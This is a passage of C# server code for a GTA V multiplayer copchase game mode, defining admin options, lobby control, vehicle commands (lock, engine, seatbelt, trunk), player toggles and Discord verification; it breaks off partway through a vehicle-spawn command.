using GTANetworkAPI;
using Microsoft.EntityFrameworkCore;
using Microsoft.EntityFrameworkCore.Internal;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using System.Threading.Tasks;

namespace RNC
{
    class Commands : Script
    {
        [Command("serveroptions", "!{#AFAFAF}[USAGE] serveroptions (option) | use 'help' to get all options", GreedyArg = true)]
        public void cmd_serveroptions(Player player, string action)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:serveroptions:{action.Replace(":", "|")}"); } catch { }

            if (action.StartsWith("maxinlobby", StringComparison.OrdinalIgnoreCase))
            {
                string[] args = action.Split(' ');
                if (args.Count() > 1)
                {
                    int value = 0;
                    if (!Int32.TryParse(args[1], out value) || value < 1 || value > 999)
                    {
                        player.TriggerEvent("pushMsgToChat", $"!{{#999999}}Max players in a lobby should be between 1-999!");
                        return;
                    }

                    Settings.Dynamics.MaxInLobby = value;

                    Main.SaveDynamicSettings();

                    Logs.LogAdmin(player, $"Set max players per lobby to {value}.");
                    EPlayer.SendMessageToAll($"!{{#FF6347}}AdmCmd: !{{#FFFFFF}}{((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has changed max players in a lobby to {value}.");
                }
                else player.TriggerEvent("pushMsgToChat", "!{#999999}Proper usage: /serveroptions maxinlobby <amount>");
            }
            else if(action.StartsWith("parkedvehs"))
            {
                Settings.SpawnParkedVehicles = !Settings.SpawnParkedVehicles;
                EPlayer.SendMessageToAll($"!{{#FF6347}}AdmCmd: !{{#FFFFFF}}{((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has toggled random parked vehicles in copchase {(Settings.SpawnParkedVehicles ? "ON" : "OFF")}.");
            }

            else if (action.StartsWith("derbyveh", StringComparison.OrdinalIgnoreCase))
            {
                string[] args = action.Split(' ');
                if (args.Count() > 1)
                {
                    Settings.Dynamics.DerbyVehicle = args[1];

                    Main.SaveDynamicSettings();

                    Logs.LogAdmin(player, $"Changed derby vehicle to {Settings.Dynamics.DerbyVehicle}");
                    EPlayer.SendMessageToAll($"!{{#FF6347}}AdmCmd: !{{#FFFFFF}}{((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has set derby vehicle model to {Settings.Dynamics.DerbyVehicle}.");
                }
                else player.TriggerEvent("pushMsgToChat", "!{#999999}Proper usage: /serveroptions derbyveh <model name>");
            }

            else if (action.StartsWith("onfootcollisions", StringComparison.OrdinalIgnoreCase))
            {
                string[] args = action.Split(' ');
                if (args.Count() > 1)
                {
                    bool value = false;

                    if (!Boolean.TryParse(args[1], out value))
                    {
                        player.TriggerEvent("pushMsgToChat", $"!{{#999999}}OnfootCollisions can only be either 'true' or 'false'! (If its false all players will have no collision onfoot until chase ends)");
                        return;
                    }

                    Settings.Dynamics.OnfootCollision = value;

                    Main.SaveDynamicSettings();

                    Logs.LogAdmin(player, $"Set on-foot collisions to {value.ToString()}.");
                    EPlayer.SendMessageToAll($"!{{#FF6347}}AdmCmd: !{{#FFFFFF}}{((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has set copchase onfoot collisions to {value.ToString()}.");
                }
                else player.TriggerEvent("pushMsgToChat", "!{#999999}Proper usage: /serveroptions onfootcollisions <true/false>");
            }
            else if (action.StartsWith("help", StringComparison.OrdinalIgnoreCase))
            {
                player.TriggerEvent("pushMsgToChat", "maxinlobby => Maximum players in a lobby.");
                player.TriggerEvent("pushMsgToChat", "derbyveh => Model name of derby vehicle.");
                player.TriggerEvent("pushMsgToChat", "usediscord => Whether to use discord module or not.");
                player.TriggerEvent("pushMsgToChat", "onfootcollisions => Toggle onfoot collisions in copchase.");
                player.TriggerEvent("pushMsgToChat", "afob => Toggle copchase Anti Fall Off Bike.");
                player.TriggerEvent("pushMsgToChat", "speedafob => Max speed for anti fall off to trigger/work.");
                player.TriggerEvent("pushMsgToChat", "camupdate => Please don't touch. Rate clients update cam direction to server.");
                player.TriggerEvent("pushMsgToChat", "ooc => Toggles the OOC chat in server. (Does not save during restarts)");
            }
            else if (action.StartsWith("ooc", StringComparison.OrdinalIgnoreCase))
            {
                Settings.OOC = !Settings.OOC;
                Settings.LoggedInPlayers.ForEach(a =>
                a.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}AdmCmd: OOC chat has been {(Settings.OOC == true ? "!{#33C446}enabled" : "!{#FF0000}disabled")} !{{#FF6347}}by an administrator."));
            }
            else if (action.StartsWith("speedafob", StringComparison.OrdinalIgnoreCase))
            {
                string[] args = action.Split(' ');
                if (args.Count() > 1)
                {
                    int speed = 0;

                    if (!Int32.TryParse(args[1], out speed))
                    {
                        player.TriggerEvent("pushMsgToChat", $"!{{#999999}}Maximum trigger speed limit can only be '0-999'");
                        return;
                    }

                    Settings.Dynamics.AntiFallOffBikeSpeedLimit = speed;

                    Main.SaveDynamicSettings();

                    Logs.LogAdmin(player, $"Set AFOB Speed Lim to {speed.ToString()}.");
                    EPlayer.SendMessageToAll($"!{{#FF6347}}AdmCmd: !{{#FFFFFF}}{((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has set chase Anti Fall Off Bike max speed limit to {speed.ToString()}.");
                }
                else player.TriggerEvent("pushMsgToChat", "!{#999999}Proper usage: /serveroptions speedafob <max speed>");
            }
            else if (action.StartsWith("camupdate", StringComparison.OrdinalIgnoreCase))
            {
                string[] args = action.Split(' ');
                if (args.Count() > 1)
                {
                    int speed = 10;

                    if (!Int32.TryParse(args[1], out speed) || speed < 10 || speed > 100000)
                    {
                        player.TriggerEvent("pushMsgToChat", $"!{{#999999}}Camera update delay can only be '10-100000' Use 699 to disable.");
                        return;
                    }

                    Settings.Dynamics.CameraSettingsUpdate = speed;

                    Main.SaveDynamicSettings();

                    Logs.LogAdmin(player, $"Set camera update rate to {speed.ToString()}.");
                    EPlayer.SendMessageToAll($"!{{#FF6347}}AdmCmd: !{{#FFFFFF}}{((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has set camera updater rate to {speed.ToString()}.");
                }
                else player.TriggerEvent("pushMsgToChat", "!{#999999}Proper usage: /serveroptions camupdate <flashlight cam update rate>");
            }
            else if (action.StartsWith("afob", StringComparison.OrdinalIgnoreCase))
            {
                string[] args = action.Split(' ');
                if (args.Count() > 1)
                {
                    bool value = false;

                    if (!Boolean.TryParse(args[1], out value))
                    {
                        player.TriggerEvent("pushMsgToChat", $"!{{#999999}}Anti fall off bike can only be either 'true' or 'false'!");
                        return;
                    }

                    Settings.Dynamics.AntiFallOffBike = value;

                    Main.SaveDynamicSettings();

                    Logs.LogAdmin(player, $"Set AFOB to {value.ToString()}.");
                    EPlayer.SendMessageToAll($"!{{#FF6347}}AdmCmd: !{{#FFFFFF}}{((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has set Anti Fall Off Bike to {value.ToString()} for chases.");
                }
                else player.TriggerEvent("pushMsgToChat", "!{#999999}Proper usage: /serveroptions afob <true/false>");
            }

            else if (action.StartsWith("usediscord", StringComparison.OrdinalIgnoreCase))
            {
                string[] args = action.Split(' ');
                if (args.Count() > 1)
                {
                    bool value = false;

                    if (!Boolean.TryParse(args[1], out value))
                    {
                        player.TriggerEvent("pushMsgToChat", $"!{{#999999}}UseDiscord can only be either 'true' or 'false'!");
                        return;
                    }

                    Settings.Dynamics.Discord = value;

                    Main.SaveDynamicSettings();

                    Logs.LogAdmin(player, $"Set server Discord integration to {value.ToString()}.");
                    EPlayer.SendMessageToAll($"!{{#FF6347}}AdmCmd: !{{#FFFFFF}}{((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has set server discord integration to {value.ToString()}.");
                }
                else player.TriggerEvent("pushMsgToChat", "!{#999999}Proper usage: /serveroptions usediscord <true/false>");
            }

            else player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid option, possible options: 'maxinlobby, derbyveh, usediscord, onfootcollisions, afob, speedafob, camupdate'");

            return;
        }

        [Command("dbgcreatepickup")]
        public void cmd_createpickup(Player player, string model, int r, int g, int b, int range, int intensity, int shadow)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You do not have the permission to use this command.");
                return;
            }

            LobbyData lobby = Settings.Lobbies.Find(a => a.lobbyId == player.GetSharedData<int>("InLobby"));

            if (lobby == null) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in a copchase lobby."); return; }


            Pickup newPickup = new Pickup(NAPI.Util.GetHashKey(model), player.Position.Around(5f), 1.0f, player.Dimension, true, Pickups.ToPropLighting(r, g, b, range, intensity, shadow));
            lobby.Drops.Add(newPickup);
            newPickup.OnPickup = (guy) =>
            {
                guy.TriggerEvent("pushMsgToChat", $"You picked up {newPickup.id} wow damn!");

                int randomChance = new Random().Next(100);
                if (randomChance >= 60)
                {
                    guy.TriggerEvent("pushMsgToChat", $"random hits and we goin!");
                    newPickup.Destroy();
                }
            };
        }

        [Command("dbgcreateammo")]
        public void cmd_dbgcreateammo(Player player)
        {
            if (!EPlayer.LoggedIn(player)) return;
            if (EPlayer.GetAccount(player).Admin < 6) return;

            EPlayer.CreateAmmoBox(player);
        }
        [Command("dbgcreateammocar")]
        public void cmd_dbgcreateammocar(Player player)
        {
            if (!EPlayer.LoggedIn(player)) return;
            if (EPlayer.GetAccount(player).Admin < 6 || !player.IsInVehicle) return;

            Dictionary<string, int> ammoTypes = new Dictionary<string, int>();
            ammoTypes.Add("AMMO_PISTOL", 40);
            ammoTypes.Add("AMMO_SMG", 30);
            ammoTypes.Add("AMMO_RIFLE", 20);
            ammoTypes.Add("AMMO_MG", 20);
            ammoTypes.Add("AMMO_SHOTGUN", 20);
            ammoTypes.Add("AMMO_BZGAS", 3);
            player.Vehicle.SetData("BackupAmmo", ammoTypes);
        }

        [Command("trunk", Alias = "boot")]
        public void cmd_trunk(Player player)
        {
            if (!player.IsInVehicle || player.Vehicle == null) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not in any vehicle!"); return; }

            if (player.Vehicle.HasSharedData("Status_Trunk"))
            {
                if (player.Vehicle.GetSharedData<bool>("Status_Trunk") == false)
                {
                    player.Vehicle.SetSharedData("Status_Trunk", true); // This variable is ONLY supposed to be used for syncing.
                    player.Vehicle.SetSharedData("TrunkOpened", true); // THIS VARIABLE IS FOR SCRIPT SIDEDLY GETTING TRUNK STATUS...
                }
                else
                {
                    player.Vehicle.SetSharedData("Status_Trunk", false);
                    player.Vehicle.ResetSharedData("TrunkOpened");
                }
            }
            else
            {
                player.Vehicle.SetSharedData("Status_Trunk", true);
                player.Vehicle.SetSharedData("TrunkOpened", true);
            }

            return;
        }

        [Command("lock")]
        public static void cmd_lock(Player player)
        {
            Vehicle targetVeh = null;
            if (!player.IsInVehicle || player.Vehicle == null)
            {
                foreach (Vehicle v in RAGE.Entities.Vehicles.All)
                {
                    if (v.Dimension == player.Dimension && v.Position.DistanceTo(player.Position) <= 3.5)
                    {
                        if (v.HasSharedData("Team") && v.GetSharedData<int>("Team") != player.GetSharedData<int>("Team") && v.GetSharedData<int>("Team") != 10) continue;

                        targetVeh = v;
                        break;
                    }
                }
            }
            else targetVeh = player.Vehicle;

            if (targetVeh == null)
            {
                if (!player.HasData("SilentLock")) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not close enough to a vehicle!"); }
                player.ResetData("SilentLock");
                return;
            }

            if (targetVeh.HasSharedData("Team") && targetVeh.GetSharedData<int>("Team") != player.GetSharedData<int>("Team") &&
                targetVeh.Locked == true)
            {
                if (!player.HasData("SilentLock")) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot unlock this vehicle - use a lockpick ~y~(/lockpick)~w~!"); }
                player.ResetData("SilentLock");
                return;
            }

            LobbyData ld = Settings.Lobbies.FirstOrDefault(l => l.lobbyId == player.GetSharedData<int>("InLobby"));
            if (ld != null)
            {
                if (ld.gameMode == GameModes.BANKROBBERY && player.GetSharedData<int>("Team") == 0 && ld.BankRobbery.State < 1)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Nice try, you cannot unlock this vehicle yet! Wait for the leader to take the money first.");
                    return;
                }
            }

            targetVeh.Locked = !targetVeh.Locked;
            targetVeh.SetSharedData("Locked", targetVeh.Locked);

            if (targetVeh.HasSharedData("Team") && targetVeh.GetSharedData<int>("Team") != player.GetSharedData<int>("Team"))
            {
                EPlayer.Action(player, "locks the door from inside.");
            }
            else
            {
                if (targetVeh.Locked)
                {
                    EPlayer.Action(player, "locks the door of the vehicle.");
                }
                else EPlayer.Action(player, "unlocks the door of the vehicle.");
            }

            return;
        }

        [Command("applycomps")]
        public static void cmd_applycomps(Player player)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (EPlayer.GetAccount(player).WeaponComponents != null && EPlayer.GetAccount(player).WeaponComponents.Length > 3)
            {
                Dictionary<long, wComponentData> weaponCompsData = new Dictionary<long, wComponentData>();
                weaponCompsData = NAPI.Util.FromJson<Dictionary<long, wComponentData>>(EPlayer.GetAccount(player).WeaponComponents);

                foreach (KeyValuePair<long, wComponentData> i in weaponCompsData)
                {
                    if (player.GetWeaponAmmo((WeaponHash)i.Key) > 0)
                    {
                        i.Value.Components.ForEach((long comphash) =>
                        {
                            EPlayer.AttachComponent(player, i.Key, comphash);
                        });
                    }
                }
            }
            player.TriggerEvent("pushMsgToChat", "!{#33C446}[>] !{#FFFFFF}All purchased components have been applied to your weapons.");
            return;
        }

        [Command("applyvehmods")]
        public static void cmd_applyvehmods(Player player)
        {
            if (!player.IsInVehicle || player.Vehicle == null || !EPlayer.LoggedIn(player))
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You must be in a vehicle to apply saved mods.");
                return;
            }

            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    PlayerTunings inst = await context.PlayerTunings.AsQueryable().FirstOrDefaultAsync(a => a.Model == player.Vehicle.Model && a.AccountSQLID == EPlayer.GetAccount(player).SQL_ID);
                    applyvehmods_OnFinishTuningsSearch(player, inst);
                }
            });
            return;
        }
        private static void applyvehmods_OnFinishTuningsSearch(Player player, PlayerTunings inst)
        {
            NAPI.Task.Run(() =>
            {
                if (inst != null)
                {
                    player.Vehicle.PrimaryColor = inst.PrimaryColor;
                    player.Vehicle.SecondaryColor = inst.SecondaryColor;

                    foreach (var kvp in NAPI.Util.FromJson<Dictionary<int, int>>(inst.Mods))
                    {
                        player.Vehicle.SetMod(kvp.Key, kvp.Value);

                        if (kvp.Key == 56) player.Vehicle.WheelType = kvp.Value;
                    }
                    player.Vehicle.PearlescentColor = inst.PearlescentColor;
                    player.Vehicle.WheelColor = inst.WheelColor;

                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Mods applied!");
                }
            });
        }

        [Command("engine")]
        public static void cmd_engine(Player player)
        {
            if (!player.IsInVehicle || player.Vehicle == null)
            {
                return;
            }

            if (player.Vehicle.HasSharedData("Team") && (player.Vehicle.GetSharedData<int>("Team") != player.GetSharedData<int>("Team") || player.Vehicle.GetSharedData<int>("Team") == 10) &&
                player.Vehicle.EngineStatus == false)
            {
                player.SendNotification("~r~You cannot start this vehicle - ~w~you will have to hotwire it! ~y~(/hotwire)");
                return;
            }

            if (player.VehicleSeat != 0)
            {
                player.SendNotification("~r~You are not the driver!");
                return;
            }

            player.Vehicle.EngineStatus = !player.Vehicle.EngineStatus;
            player.Vehicle.SetSharedData("Engine", player.Vehicle.EngineStatus);

            if (player.Vehicle.EngineStatus)
            {
                EPlayer.Action(player, "turns the vehicle's engine on.");
            }
            else EPlayer.Action(player, "turns the vehicle's engine off.");

            return;
        }

        [Command("seatbelt")]
        public static void cmd_seatbelt(Player player)
        {
            if (!player.IsInVehicle || player.Vehicle == null)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not inside any vehicle!");
                return;
            }

            if (player.HasData("Seatbelt"))
            {
                EPlayer.Action(player, "releases the seatbelt.");
                player.ResetData("Seatbelt");
                player.TriggerEvent("ToggleSeatbelt", false);
            }
            else
            {
                EPlayer.Action(player, "fastens the seatbelt.");
                player.SetData("Seatbelt", true);
                player.TriggerEvent("ToggleSeatbelt", true);

                EPlayer.UnlockAchievement(player, "first_seatbelt");
            }

            return;
        }

        [Command("time", Alias = "weather")]
        public void cmd_timeweather(Player player)
        {
            if (!EPlayer.LoggedIn(player)) return;

            if (player.GetSharedData<int>("InLobby") < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You must be in a lobby to use this command!");
                return;
            }

            LobbyData lobby = Settings.Lobbies.Find(a => a.lobbyId == player.GetSharedData<int>("InLobby"));
            if ((lobby != null) == false)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You must be in a lobby to use this command.");
                return;
            }

            player.TriggerEvent("pushMsgToChat", $"!{{#A8FFAB}}Time In Lobby: (H:M:S) !{{#FFFFFF}}{lobby.Time[0]}:{lobby.Time[1]}:{lobby.Time[2]}");
            player.TriggerEvent("pushMsgToChat", "!{#A8FFAB}Weather Forecast: !{#FFFFFF}" + Main.WeatherToForecast(lobby.Weather) + " (" + lobby.Weather + ")");

            return;

        }

        [Command("game", "!{#AFAFAF}[USAGE] game (option: stop, start, autostart, teambalance, mode)", GreedyArg = true)]
        public void cmd_game(Player player, string action)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:game:{action.Replace(":", "|")}"); } catch { }

            if (action.StartsWith("stop", StringComparison.OrdinalIgnoreCase))
            {
                string[] args = action.Split(' ');
                if (args.Count() > 1)
                {
                    int value = 0;
                    if (!Int32.TryParse(args[1], out value) || value < 1 || value > Settings.Lobbies.Count)
                    {
                        player.TriggerEvent("pushMsgToChat", $"!{{#999999}}Lobby ID must be between 1-{Settings.Lobbies.Count}!");
                        return;
                    }

                    if (!Main.StopGame(value, 0))
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#FF0000}Failed to stop game! Is there even a copchase running?");
                    }
                    else
                    {
                        Logs.LogAdmin(player, $"Stopped copchase in lobby {value}.");
                        EPlayer.SendMessageToAll($"!{{#FF6347}}AdmCmd: !{{#FFFFFF}}{((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has forcefully stopped the copchase in lobby {value}.");
                    }
                }
                else player.TriggerEvent("pushMsgToChat", "!{#999999}Proper usage: /game stop <lobby id>");
            }
            else if (action.StartsWith("start", StringComparison.OrdinalIgnoreCase))
            {
                string[] args = action.Split(' ');
                if (args.Count() > 1)
                {
                    int value = 0;
                    if (!Int32.TryParse(args[1], out value) || value < 1 || value > 99)
                    {
                        player.TriggerEvent("pushMsgToChat", $"!{{#999999}}Lobby ID must be between 1-{Settings.Lobbies.Count}!");
                        return;
                    }

                    Main.StartGame(value);
                    EPlayer.SendMessage(player, "~y~Attempting to start copchase. ~w~If it doesn't start, it could be due to ~y~lack of (autojoin-active) players~w~ or a ~y~round is already active~w~!");
                    Logs.LogAdmin(player, $"Attempted to force-start copchase in lobby {value}.");
                    EPlayer.SendMessageToAll($"!{{#FF6347}}AdmCmd: !{{#FFFFFF}}{((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has attempted to force-start copchase in lobby {value}.");
                    
                }
                else player.TriggerEvent("pushMsgToChat", "!{#999999}Proper usage: /game start <lobby id>");
            }
            else if (action.StartsWith("autostart", StringComparison.OrdinalIgnoreCase))
            {
                string[] args = action.Split(' ');
                if (args.Count() > 1)
                {
                    int value = 0;
                    if (!Int32.TryParse(args[1], out value) || value < 1 || value > 99)
                    {
                        player.TriggerEvent("pushMsgToChat", $"!{{#999999}}Lobby ID must be between 1-{Settings.Lobbies.Count}!");
                        return;
                    }
                    LobbyData lobby = Settings.Lobbies.Find(a => a.lobbyId == value);
                    if (lobby != null)
                    {
                        lobby.GameAutoStart = !lobby.GameAutoStart;
                        Logs.LogAdmin(player, $"Toggled autostart in lobby {lobby.lobbyId} to " + (lobby.GameAutoStart == true ? "ON" : "OFF"));

                        if (lobby.GameAutoStart)
                        {
                            Settings.LoggedInPlayers.ForEach(target => EPlayer.Notify(target, $"<strong>{((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)}</strong> has enabled copchases in <strong>lobby {lobby.lobbyId}</strong>.", "green", "fas fa-check", false, 1500, "bottomCenter", "replace"));
                        }
                        else
                        {
                            Settings.LoggedInPlayers.ForEach(target => EPlayer.Notify(target, $"<strong>{((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)}</strong> has disabled copchases in <strong>lobby {lobby.lobbyId}</strong>.", "red", "fas fa-ban", false, 1500, "bottomCenter", "replace"));
                        }
                    }
                    else player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}AdmCmd: !{{#FFFFFF}}The lobby id is invalid or doesn't exist.");
                }
                else player.TriggerEvent("pushMsgToChat", "!{#999999}Proper usage: /game autostart <lobby id>");
            }
            else if (action.StartsWith("teambalance", StringComparison.OrdinalIgnoreCase))
            {
                string[] args = action.Split(' ');
                if (args.Count() > 2)
                {
                    int value = 0;
                    int lobbyid = 0;
                    if (!Int32.TryParse(args[1], out lobbyid) || lobbyid < 1 || lobbyid > Settings.Lobbies.Count)
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#999999}Lobby ID must be in numbers between 1-" + Settings.Lobbies.Count + "!");
                        return;
                    }
                    if (!Int32.TryParse(args[2], out value) || value < 1 || value > 99)
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#999999}Team balance must be in numbers between 1-99!");
                        return;
                    }

                    LobbyData lobby = Settings.Lobbies.Find(a => a.lobbyId == lobbyid);
                    if ((lobby != null) == false)
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#999999}Lobby ID is invalid!");
                        return;
                    }

                    lobby.FugitivePercent = value;

                    Logs.LogAdmin(player, $"Set teambalance in lobby {lobby.lobbyId} to {value}% fugitives.");
                    EPlayer.SendMessageToAll($"!{{#FF6347}}AdmCmd: !{{#FFFFFF}}{((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has set lobby {lobby.lobbyId}'s fugitives percentage to {lobby.FugitivePercent}%.");
                }
                else player.TriggerEvent("pushMsgToChat", "!{#999999}Proper usage: /game teambalance <lobby id> <percentage of fugitives>");
            }
            else if (action.StartsWith("mode", StringComparison.OrdinalIgnoreCase))
            {
                string[] args = action.Split(' ');
                if (args.Count() > 2)
                {
                    int lobbyid = 0;
                    if (!Int32.TryParse(args[1], out lobbyid) || lobbyid < 1 || lobbyid > Settings.Lobbies.Count)
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#999999}Lobby ID must be in numbers between 1-" + Settings.Lobbies.Count + "!");
                        return;
                    }

                    LobbyData lobby = Settings.Lobbies.Find(a => a.lobbyId == lobbyid);
                    if ((lobby != null) == false)
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#999999}Lobby ID is invalid!");
                        return;
                    }

                    if (args[2].Equals("standard", StringComparison.OrdinalIgnoreCase))
                    {
                        lobby.gameMode = GameModes.STANDARD;
                    }
                    else if (args[2].Equals("busted", StringComparison.OrdinalIgnoreCase))
                    {
                        lobby.gameMode = GameModes.BUSTED;
                    }
                    else if (args[2].Equals("bankrob", StringComparison.OrdinalIgnoreCase))
                    {
                        lobby.gameMode = GameModes.BANKROBBERY;
                    }
                    else { player.TriggerEvent("pushMsgToChat", "!{#999999}Proper usage: /game mode <lobby id> <mode: 'standard', 'busted', 'bankrob'>"); return; }

                    Logs.LogAdmin(player, $"Changed lobby {lobby.lobbyId}'s gamemode to {args[2]}");
                    EPlayer.SendMessageToAll($"!{{#FF6347}}AdmCmd: !{{#FFFFFF}}{((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has set lobby {lobby.lobbyId}'s mode to {Main.ConvertGameMode(lobby.gameMode)}.");
                }
                else player.TriggerEvent("pushMsgToChat", "!{#999999}Proper usage: /game mode <lobby id> <mode: 'standard', 'busted', 'bankrob'>");
            }
            else player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid option, possible options: 'start', 'stop', 'autostart', 'teambalance', 'mode'");

            return;
        }

        [Command("tog", "!{#AFAFAF}[USAGE] tog (option: hud, pm, radio, ooc)", GreedyArg = true, Alias = "toggle")]
        public void cmd_tog(Player player, string action)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (action.StartsWith("hud", StringComparison.OrdinalIgnoreCase))
            {
                player.TriggerEvent("pushMsgToChat", "!{#33C446}[#] !{#FFFFFF}Please press F7 to toggle HUD.");
            }
            else if (action.StartsWith("pm", StringComparison.OrdinalIgnoreCase))
            {
                player.SetData("PMState", !player.GetData<bool>("PMState"));
                if (player.GetData<bool>("PMState") == true)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#33C446}[#] !{#FFFFFF}You have enabled your PMs.");
                }
                else player.TriggerEvent("pushMsgToChat", "!{#FF6347}[#] !{#FFFFFF}You have disabled your PMs.");
            }
            else if (action.StartsWith("ooc", StringComparison.OrdinalIgnoreCase))
            {
                player.SetData("OOCState", !player.GetData<bool>("OOCState"));
                if (player.GetData<bool>("OOCState") == true)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#33C446}[#] !{#FFFFFF}You have enabled OOC chat.");
                }
                else player.TriggerEvent("pushMsgToChat", "!{#FF6347}[#] !{#FFFFFF}You have disabled OOC chat.");
            }
            else if (action.StartsWith("radio", StringComparison.OrdinalIgnoreCase))
            {
                player.TriggerEvent("ToggleClientRadio");
            }
            else player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Invalid option, possible options: 'hud', 'pm', 'radio', 'ooc'");

            return;
        }

        [Command("info", Alias = "discord")]
        public void cmd_info(Player player)
        {
            player.TriggerEvent("pushMsgToChat", "!{FFFF00}============| SERVER INFORMATION |============");

            player.TriggerEvent("pushMsgToChat", "!{#ffae00}Race !{#FFFFFF}'n !{#0097FF}Chase !{#FFFFFF}v" + Settings.Version);
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}Server Discord: !{#0097FF}discord.gg/y3g2WuR");
            player.TriggerEvent("pushMsgToChat", "!{#FFFF00}Website: !{#FFAE00}www.racenchase.com");
            player.TriggerEvent("pushMsgToChat", "  ");
            player.TriggerEvent("pushMsgToChat", "!{#FFFFFF}Developers: !{#FF6347}KevY (Lead), jambredrek (Game) and RotX (Web/UI)");
            player.TriggerEvent("pushMsgToChat", "!{#FFFFFF}Thanks to all those who participated in !{#FF6347}beta testing and early launch!{#FFFFFF}.");
            player.TriggerEvent("pushMsgToChat", "  ");
            player.TriggerEvent("pushMsgToChat", "!{#c9c9c9}If you are looking for your Discord verification code, use (/verify). ;-)");
            return;
        }
        [Command("verify")]
        public void cmd_verify(Player player)
        {
            DiscordData _d = NAPI.Util.FromJson<DiscordData>(EPlayer.GetAccount(player).DiscordInfo);
            if (_d.DiscordID != "n/a")
            {
                player.TriggerEvent("pushMsgToChat", "~y~Your Discord account is already linked.");
                return;
            }

            player.TriggerEvent("pushMsgToChat", "~w~====================> !{#0097ff}HOW TO VERIFY ~w~<====================");
            player.TriggerEvent("pushMsgToChat", "~y~[1]~w~ Join our !{#0097ff}Discord ~y~(discord.gg/y3g2WuR)~w~.");
            player.TriggerEvent("pushMsgToChat", "~y~[2]~w~ Head into the !{#0097ff}#bot-commands ~w~channel.");
            player.TriggerEvent("pushMsgToChat", "~y~[3]~w~ Use command ~y~/verify !{#a6ffa7}(name)!{#ffa6a6}(code) ~w~to verify.");
            player.TriggerEvent("pushMsgToChat", "~w~And that's it! The process is very straight-forward. You, for example, have to enter:");
            player.TriggerEvent("pushMsgToChat", $"~y~!verify !{{#a6ffa7}}{player.Name} !{{#ffa6a6}}{_d.DiscordCode}");
            player.TriggerEvent("pushMsgToChat", " ");
            player.TriggerEvent("pushMsgToChat", "~y~Your Discord code: ~w~" + _d.DiscordCode);
        }

        [Command("aveh", "!{#AFAFAF}[USAGE] aveh (vehicle model) (optional: pri. col) (optional: sec. col)", Alias = "av")]
        public void cmd_aveh(Player player, string carname, int col1 = -1, int col2 = -1)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
